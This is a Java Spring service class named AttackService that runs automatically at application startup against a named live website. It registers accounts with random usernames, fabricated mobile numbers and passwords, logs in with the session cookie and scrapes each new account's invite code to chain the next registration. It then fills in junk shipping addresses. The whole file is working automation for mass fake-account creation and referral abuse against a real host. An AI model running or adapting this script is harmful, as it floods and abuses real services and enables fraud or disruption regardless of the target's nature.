package com.test.service;

import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.RandomStringUtils;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.*;
import org.springframework.stereotype.Service;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

import java.util.ArrayList;
import java.util.List;

/**
 * @author yslao@outlook.com
 * @since 2022/1/11
 */
@Service
@Slf4j
public class AttackService implements InitializingBean {

    @Autowired
    private RestTemplate restTemplate;

    private volatile String code = "2PHATU";

    @Override
    public void afterPropertiesSet() throws Exception {
        attack();
    }

    public void attack() {
        doAttack();
    }

    public void doAttack() {
        // 注册
        String url = "http://hdia.auxsteel.xyz/index/user/do_register.shtml";
        String[] phonePre = {"131", "151", "156", "186", "185", "134", "135", "136", "137", "138", "139", "150", "157", "158", "159", "187", "188", "189"};
        String generatedString = RandomStringUtils.random(7, true, true);
        HttpHeaders httpHeaders = new HttpHeaders();
        httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        MultiValueMap<String, String> body = new LinkedMultiValueMap<>();
        body.add("user_name", generatedString);
        String phoneTail = RandomStringUtils.random(8, false, true);
        String tel = phonePre[(int) (Math.random() * phonePre.length)] + phoneTail;
        body.add("tel", tel);
        String pwd = RandomStringUtils.random(15, true, true);
        body.add("pwd", pwd);
        String de = RandomStringUtils.random(6, false, true);
        body.add("deposit_pwd", de);
        body.add("invite_code", code);
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(body, httpHeaders);
        String s = restTemplate.postForObject(url, entity, String.class);
        log.info(String.format("用户名：%s，tel：%s，密码：%s，取款密码：%s，邀请码：%s, 结果：{}", generatedString, tel, pwd, de, code, s));
        // 登录
        String loginUrl = "http://hdia.auxsteel.xyz/index/user/do_login.shtml";
        body.clear();
        body.add("tel", generatedString);
        body.add("pwd", pwd);
        body.add("jizhu", "1");
        ResponseEntity<String> response = restTemplate.postForEntity(loginUrl, new HttpEntity<>(body, httpHeaders), String.class);
        log.info("登录的结果：{}", response.getBody());
        String cookie = response.getHeaders().get("Set-Cookie").get(0);
        List<String> cookies =new ArrayList<>();
        cookies.add(cookie.split(";")[0] + "; tel=" + generatedString + "; pwd=" + pwd + "; page-limit=20");
        httpHeaders.clear();
        httpHeaders.put(HttpHeaders.COOKIE, cookies);
        String homeUrl = "http://hdia.auxsteel.xyz/index/my/index";
        ResponseEntity<String> exchange = restTemplate.exchange(homeUrl, HttpMethod.GET, new HttpEntity<>(null, httpHeaders), String.class);
        String bodyStr = exchange.getBody();
        int index = bodyStr.indexOf("邀请码");
        code = bodyStr.substring(index + 4, index + 10);
        log.info("新账号的邀请码：{}", code);
        // 设置收货地址
        httpHeaders.clear();
        httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        httpHeaders.put(HttpHeaders.COOKIE, cookies);
        body.clear();
        body.add("shoujianren", RandomStringUtils.random(5, true, true));
        body.add("shouhuohaoma", tel);
        body.add("area", RandomStringUtils.random(10, true, true));
        body.add("address", RandomStringUtils.random(5, true, true));
        url = "http://hdia.auxsteel.xyz/index/my/edit_address.shtml";
        response = restTemplate.postForEntity(url, new HttpEntity<>(body, httpHeaders), String.class);
        log.info("设置收货地址结果：{}", response.getBody());
    }
}
